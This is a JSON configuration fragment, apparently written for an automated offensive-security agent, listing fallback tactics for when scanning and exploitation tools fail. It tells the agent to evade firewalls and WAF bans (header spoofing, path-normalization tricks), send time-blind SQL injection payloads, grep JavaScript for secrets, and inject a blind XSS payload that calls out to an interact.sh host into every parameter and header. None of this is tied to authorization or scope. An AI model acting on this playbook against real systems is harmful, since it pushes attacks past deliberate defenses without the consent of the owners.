    "tool_alternatives": {
        "nmap": "[BLOCKED BY FW / SLOW] Nmap failed. SUGGESTION: 1) Try `naabu -top-ports 1000 -c 50`. 2) If still blocked, use `masscan` or perform highly targeted TCP SYN via custom Scapy script.",
        "sqlmap": "[WAF / TIME-BLIND] SQLmap failed. SUGGESTION: 1) Switch to `ghauri` for advanced evasion. 2) Fallback to `curl` with manual time-delay payloads (e.g., `pg_sleep(10)`). 3) Test for NoSQLi instead (`nosqli`).",
        "subfinder": "[API LIMITS] Subfinder exhausted. SUGGESTION: 1) Correlate with `amass enum -passive`. 2) Use `shosubgo` or `github-subdomains` for OSINT discovery.",
        "ffuf": "[WAF BAN / 403s] Ffuf getting 403s. SUGGESTION: 1) Add header `-H 'X-Forwarded-For: 127.0.0.1'`. 2) Try path normalization evasion (`/%2e/`). 3) Use `feroxbuster --random-agent`.",
        "httpx": "[TIMEOUTS] Httpx hanging. SUGGESTION: Run with `-rl 50 -t 50 -retries 2` to throttle requests and prevent WAF blacklisting.",
        "nuclei": "[NO CVE FOUND] Nuclei finished with no results. SUGGESTION: STOP relying on templates. Transition immediately to Phase 5: Manual Business Logic testing. Open Python and write a script to test IDORs on API endpoints.",
        "waybackurls": "Try gau or waymore",
        "katana": "[JS RENDER FAILED] Katana cannot see links. SUGGESTION: The target is a modern SPA (React/Vue). Katana won't work well alone. Use a Puppeteer script or manually inspect the main `.js` bundle using `linkfinder` or `jsluice`.",
        "arjun": "Try x8 or param-miner for parameter discovery",
        "jwt_tool": "Use Burp Suite's JWT extension if intercepting",
        "wpscan": "[API REQUIRED] WPScan limited. SUGGESTION: Use `nuclei -t http/wordpress/` or manually inspect `/wp-content/plugins/` directory.",
        "wfuzz": "Migrate to ffuf or feroxbuster for better performance in Go/Rust",
        "dirbuster": "Deprecated. Use ffuf or feroxbuster",
        "trufflehog": "[FALSE POSITIVES] Trufflehog overwhelming. SUGGESTION: Use `gitleaks detect` or manually run `ripgrep` for specific patterns (e.g., `rg -i 'api_key|secret|password'` in `.js` files).",
        "dalfox": "[BLIND XSS] Dalfox failed. SUGGESTION: Use `interactsh-client` and manually inject payload `<script>fetch('http://[id].interact.sh')</script>` into every parameter and header via `var_mapper.py`.",
        "browser_action": "[DOM INTERACTION] Browser automation failed. SUGGESTION: Don't give up. The application might require a specific sequence of clicks or login state. Write a targeted Python Playwright/Puppeteer script to interact with the DOM slowly."
